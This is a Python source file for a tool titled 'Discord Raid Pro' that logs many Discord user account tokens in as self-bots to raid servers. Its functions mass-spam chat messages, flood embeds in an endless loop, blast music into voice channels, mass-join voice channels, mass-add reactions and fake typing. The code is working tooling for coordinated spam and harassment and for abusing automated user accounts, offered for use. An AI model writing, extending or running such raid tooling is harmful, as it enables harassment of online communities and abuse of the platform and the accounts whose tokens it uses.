import asyncio
import discord
from discord.ext import commands
import os
from common import *
import youtube_dl
import time
import emoji
import requests
import argparse
import threading
import random

#notes
#required modules
#pip install youtube_dl
#pip install pynacl
#choco install ffmpeg

class TextSpam():
    def __init__(self, token , prefix= '***', loop=None, bot_count=1, channel_spam= None, messages_to_spam= None):
        self.channel_spam = int(channel_spam)
        self.bot_count = bot_count
        self.loop = loop
        #asyncio.set_event_loop(self.loop)
        self.prefix = prefix
        self.token = token
        self.messages_to_spam = messages_to_spam
        self.bot = commands.Bot(command_prefix= self.prefix, loop = self.loop)

    async def run(self):
        @self.bot.event
        async def on_ready():
            print(f'[{self.bot_count}] {self.bot.user.name}#{self.bot.user.discriminator} id: {self.bot.user.id}')

        @self.bot.event
        async def on_message(message):
            if message.channel.id == self.channel_spam: 
                for x in self.messages_to_spam:
                    await message.channel.send(x)   
        
        await self.bot.start(self.token, bot=False)

def text_spam():
    parserx = start_parse()
    os.system('title Discord Raid Pro [Console] ^| Text Spam')
    os.system('mode 100, 30')

    print('File path', parserx.insert)
    print('Channel id', parserx.message)

    channel_id = int(parserx.message)
    tokens = extract_token(parserx.insert)
    messages_to_spam = []

    while True:
        clear()
        message_spam = input("Enter messages to spam [enter q to exit] >  ")
        if message_spam == "q":
            break
        
        messages_to_spam.append(message_spam)        

    clear()

    print(f'The following messages will be spammed to the channel id {channel_id} \n')

    for mes in messages_to_spam:
        print(mes)

    print('\n')
    input(f'Hit enter to continue.')

    clear()
    print("You may close this window to stop spamming. \n")
    print('[*] ~ TOKEN INFORMATION ~ \n')

    main_loop = asyncio.new_event_loop()
    bot_count = 1 
    objects = {}

    for i, input_token in zip(range(len(tokens)), tokens):
        objects[i] = TextSpam(input_token, loop=main_loop, bot_count= bot_count, channel_spam= channel_id, messages_to_spam= messages_to_spam)
        bot_count += 1

    for z in range(len(tokens)):
        main_loop.create_task(objects[z].run())

    main_loop.run_forever()
class MusicSpam():
    def __init__(self, token, vcid, loop=None):
        self.bot = commands.Bot(description='music-player', command_prefix="***", self_bot=True, loop=loop)
        self.token = token
        self.vcid = vcid

    async def run(self):
        @self.bot.event
        async def on_ready():
            print(f'{self.bot.user.name}#{self.bot.user.discriminator} id: {self.bot.user.id}')

            try:
                voiceChannel = self.bot.get_channel(int(self.vcid))

                print('Voice channel:', voiceChannel)

                vc = await voiceChannel.connect()
                vc.play(discord.FFmpegPCMAudio('temp/music.mp3'))
            
            except Exception as e:
                print('Exception:', e)

        await self.bot.start(self.token, bot=False)

def music_setup(yt_link):
    song_dir = os.path.isfile('temp/music.mp3')

    try:
        if song_dir:
            print('Removed music.mp3 from temp')
            os.remove('temp/music.mp3')

    except PermissionError:
        print('PermissionError.')
        return 

    ydl_opts = {
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],

        'outtmpl': os.getcwd() + '\\temp' + '/music.%(ext)s'
    }

    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        print('Downloading', yt_link)
        ydl.download([yt_link])


def music_start(token_list, vcid):
    main_loop = asyncio.new_event_loop()
    objects = {}
    for i, input_token in zip(range(len(token_list)), token_list):
        objects[i] = MusicSpam(input_token, vcid, loop=main_loop)

    for z in range(len(token_list)):
        main_loop.create_task(objects[z].run())

    main_loop.run_forever()
def music_spammer():
    parserx = start_parse()
    vcid = parserx.message
    file_path = parserx.insert
    token_list = extract_token(file_path)
    clear()
    yt_link = input('Youtube video link to play: ')
    music_setup(yt_link)
    os.system('title Discord Raid Pro [Console] ^| VC Music Spammer')
    os.system('mode 100, 30')
    music_start(token_list, vcid )
    print('Playing music..')


class VCJoin():
    def __init__(self, token, vcid, loop=None):
        self.bot = commands.Bot(description='voice-channel-join', command_prefix="***", self_bot=True, loop=loop)
        self.token = token
        self.vcid = vcid

    async def run(self):
        @self.bot.event
        async def on_ready():
            print(f'{self.bot.user.name}#{self.bot.user.discriminator} [id:{self.bot.user.id}] ready.')
            voiceChannel = self.bot.get_channel(int(self.vcid))
            if voiceChannel:
                print(f'{self.bot.user.name}#{self.bot.user.discriminator} has connected to {voiceChannel}.')
                await voiceChannel.connect()
      
            else:
                print('Unable to join.')

        await self.bot.start(self.token, bot=False)

class VCLeave():
    def __init__(self, token, vcid, loop=None):
        self.bot = commands.Bot(description='voice-channel-leave', command_prefix="***", self_bot=True, loop=loop)
        self.token = token
        self.vcid = vcid

    async def run(self):
        @self.bot.event
        async def on_ready():
            print(f'{self.bot.user.name}#{self.bot.user.discriminator} [id:{self.bot.user.id}] ready.')
            voiceChannel = self.bot.get_channel(int(self.vcid))
            if voiceChannel:
                print(f'{self.bot.user.name}#{self.bot.user.discriminator} connected to {voiceChannel}. Disconnecting..')
                vc = await voiceChannel.connect()
                await vc.disconnect()
            else:
                print('Unable to leave.')

        await self.bot.start(self.token, bot=False)

def _join_vc(vcid, token_list):
    main_loop = asyncio.new_event_loop()
    objects = {}
    for i, input_token in zip(range(len(token_list)), token_list):
        objects[i] = VCJoin(input_token, vcid, loop=main_loop)

    for z in range(len(token_list)):
        main_loop.create_task(objects[z].run())
    main_loop.run_forever()

def join_vc():
    parserx = start_parse()
    token_list = extract_token(parserx.insert)
    vc_id = parserx.message
    clear()
    os.system('title Discord Raid Pro [Console] ^| VC Join')
    os.system('mode 100, 30')
    print('Closing this window will logout from all tokens.')
    _join_vc(vc_id, token_list)

def _leave_vc(vcid, token_list):
    main_loop = asyncio.new_event_loop()
    objects = {}
    for i, input_token in zip(range(len(token_list)), token_list):
        objects[i] = VCLeave(input_token, vcid, loop=main_loop)

    for z in range(len(token_list)):
        main_loop.create_task(objects[z].run())
    main_loop.run_forever()

def leave_vc():
    parserx = start_parse()
    token_list = extract_token(parserx.insert)
    vc_id = parserx.message
    clear()
    os.system('title Discord Raid Pro [Console] ^| VC Leave')
    os.system('mode 100, 30')
    _leave_vc(vc_id, token_list)

class StatusChange:
    def __init__(self, loop, token, status, variable=None, stream_name=None):
        self.loop = loop
        self.bot = commands.Bot(command_prefix='?', loop=self.loop)
        
        self.token = token
        self.status =status
        self.variable = variable
        self.stream_name = stream_name
        
    async def run(self):
        @self.bot.event
        async def on_ready():
            print(f'[!] Logged in to {self.bot.user.name}#{self.bot.user.discriminator} id: {self.bot.user.id}')
            
            if not self.variable:
                print(f"[!] Changing {self.bot.user.name}'s status to {self.status}")

            if self.variable:
                print(f"[!] Changing {self.bot.user.name}'s status to {self.status} {self.variable}")


            if self.status == 'game':
          
                await self.bot.change_presence(activity=discord.Game(name=self.variable))

            elif self.status == 'streaming':
              

                await self.bot.change_presence(activity=discord.Streaming(name=self.stream_name, url=self.variable))

            elif self.status == 'listening':
               
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=self.variable))
            elif self.status == 'watching':
           
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=self.variable))

            elif self.status == 'online':
            
                await self.bot.change_presence(status=discord.Status.online)

            elif self.status == 'do_not_disturb':
                await self.bot.change_presence(status=discord.Status.do_not_disturb)

            elif self.status == 'idle':
          
                await self.bot.change_presence(status=discord.Status.idle)
            
            else:
                print('Was not abled to change status. ')
        await self.bot.start(self.token, bot=False)


def user_loop(loop, token_list):
    main_loop = loop
    tokens = token_list

    new_var = {}
    bot_count = 0

    user_input = input('[>] Command > ')

    if user_input == 'game':
        variable = input('[>] Enter game name > ')

        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='game', variable=variable)
            bot_count += 1

        return (new_var, bot_count)

    elif user_input == 'streaming':
        variable = input('[>] Enter twitch link [ex. https://twitch.tv/ninja ] > ')
        stream = input('[>] Enter stream name > ')

        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='streaming', variable=variable, stream_name= stream)
            bot_count += 1

        return (new_var, bot_count)

    elif user_input == 'listening':
        variable = input('[>] Enter song > ')

        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='listening', variable=variable)
            bot_count += 1

        return (new_var, bot_count)

    elif user_input == 'watching':
        variable = input('[>] Enter what to watch > ')

        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='watching', variable=variable)
            bot_count += 1

        return (new_var, bot_count)    

    elif user_input == 'online':
        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='online')
            bot_count += 1

        return (new_var, bot_count)

    elif user_input == 'donotdisturb':
        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='do_not_disturb')
            bot_count += 1

        return (new_var, bot_count)


    elif user_input == 'idle':
        for i, input_token in zip(range(len(tokens)), tokens):
            new_var[i] = StatusChange(main_loop,input_token, status='idle')
            bot_count += 1

        return (new_var, bot_count)

    else:
        print('Invalid command!')
        time.sleep(3)
        user_loop()

    
def status_changer():
    os.system('mode 100, 30')
    os.system('title Discord Raid Pro [Console] ^| Status Changer')
    print('Leave this window open to keep status.')
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--insert', help="Add path to file", required=True)
    parserx = parser.parse_args()
    file_path = parserx.insert

    tokens = extract_token(file_path)


    print("Changing token's status can take up to 1 minute. \n")
    main_loop = asyncio.new_event_loop()

    print('Activity Choices: game, streaming, listening, watching')
    print('Status Choices: online, donotdisturb , idle ')

    task_dict, bot_count = user_loop(main_loop, tokens)

    for z in range(len(tokens)):
        main_loop.create_task(task_dict[z].run())

    thread =threading.Thread(target=main_loop.run_forever)
    thread.start()

    os.system('title Discord Raid Pro [Console] ^| Status Changer ^| Bot Count %d' % bot_count)   
    time.sleep(10)

    input('Hit ENTER to logout.')


    main_loop.call_soon_threadsafe(main_loop.stop) 

    thread.join()


def add_reaction(token, emoji_str, channel_id, message_id):
    emoji_send = emoji.emojize(emoji_str, use_aliases=True)

    headers = {'Authorization': token}

    r= requests.put(f'https://discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{emoji_send}/@me', headers=headers)
    if r.status_code == 204:
        print('Successfully added %s reaction to message' % emoji_str)

    else:
        print('Unable to add reaction to message.')

    if 'code' in r.text:
        print('[MESSAGE]', r.json()['message'])
        print('Status Code:', r.status_code)
        print(r.text)

def delete_reaction(token, emoji_str, channel_id, message_id):
    emoji_send = emoji.emojize(emoji_str, use_aliases=True)

    headers = {'Authorization': token}

    r= requests.delete(f'https://discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{emoji_send}/@me', headers=headers)

    if r.status_code == 204:
        print('Deleted %s reaction from message' % emoji_str)

    else:
        print('Unable to delete reaction from message.')

    if 'code' in r.text:
        print('[MESSAGE]', r.json()['message'])
        print('Status Code:', r.status_code)
        print(r.text)

def reaction_adder():
    os.system('title Discord Raid Pro [Console] ^| Reaction Adder')   
    os.system('mode 100, 30')   
    parserx = start_parse()
    file_path = parserx.insert
    channel_id = parserx.message

    token_list = extract_token(file_path)

    message_id = input('Enter message id > ')
    clear()
    to_react = []
    
    while True:
        print('Enter emoji to react (e.g :joy:)')
        user_input = input('Emoji [enter q to exit] > ')
        if user_input == 'q':
            break
        to_react.append(user_input)
        clear()

    for mes in to_react:
        print(mes)

    input('\nEnter to confirm.')

    clear()
    for x in token_list:
        for y in to_react:
            add_reaction(x, y, channel_id, message_id)

def send_embed(token, channel_id, title, icon_url, text, img_url, field_name, field_value,author):
    headers = {'Authorization': token}

    payload = {
        'content': '',
        'embed': {
            'title': title,
            'color': random.randint(1,16777215),
            'footer': {
                'icon_url': icon_url,
                'text': text
            },
            'image': {
                'url': img_url
            },
            'author': {
                'name': author,
                'url': 'https://github.com/NightfallGT/Discord-Raider-Pro',
                'icon_url': icon_url
            },
            'fields': [
                {
                'name': field_name,
                'value': field_value
                }
            ]
        }
    }

    r = requests.post(f"https://discord.com/api/v8/channels/{channel_id}/messages", json=payload, headers=headers)

    if r.status_code == 200:
        print('Successfully sent embed message')
        return True

    elif 'code' in r.text:
        print('[MESSAGE]', (r.json()['message']))
        print('Unable to send embed message.')

    else:
        print('Some unknown error occured')

def embed_worker(token,channel_id,title, icon_url, text, img_url, field_name, field_value, author):
    first_try = send_embed(token,channel_id,title, icon_url, text, img_url, field_name, field_value, author)

    if first_try:
        while True:
            for x in range(6):
                send_embed(token,channel_id,title, icon_url, text, img_url, field_name, field_value, author)
                time.sleep(0.9)

            time.sleep(6)

def embed_spam():
    os.system('title Discord Raid Pro [Console] ^| Embed Spammer')   
    os.system('mode 100, 30')
    parserx =start_parse() 

    channel_id = parserx.message
    file_path = parserx.insert

    token_list = extract_token(file_path)
    clear()
    print('Embed Creator')
    print('You can leave some blank (unless they are required)')

    title = input('Enter embed title > ')
    icon_url = input('Enter embed icon url [e.g https://i.redd.it/123.jpg] > ')
    text = input('Enter embed text > ')
    img_url = input('Enter img url [e.g https://i.redd.it/123.jpg] > ')
    field_name = input('Enter field name [required] > ')
    field_value = input('Enter field value [required] > ')
    author = input('Enter author > ')

    if not title:
        title = ''

    if not icon_url:
        icon_url = ''

    if not text:
        text = ''

    if not img_url:
        img_url = ''

    if not field_name:
        field_name = ''

    if not field_value:
        field_value = ''

    if not author:
        author = ''

    input('Enter to start spam')
    clear()
    print('You may close this window to stop spamming.')

    for x in token_list:
        threading.Thread(target=embed_worker, args=(x,channel_id,title, icon_url, text, img_url, field_name, field_value, author,)).start()

def type_worker(token, channel):
    headers = {'Authorization': token}
    while True:
        r = requests.post(f'https://discord.com/api/v8/channels/{channel}/typing', headers=headers)
        if r.status_code == 204:
            print('Fake typing...')
        time.sleep(12)

def fake_typing():
    os.system('title Discord Raid Pro [Console] ^| Fake Typer')   
    os.system('mode 100, 30')
    parserx =start_parse() 

    channel_id = parserx.message
    file_path = parserx.insert

    token_list = extract_token(file_path)

    for x in token_list:
        threading.Thread(target=type_worker, args=(x,channel_id,)).start()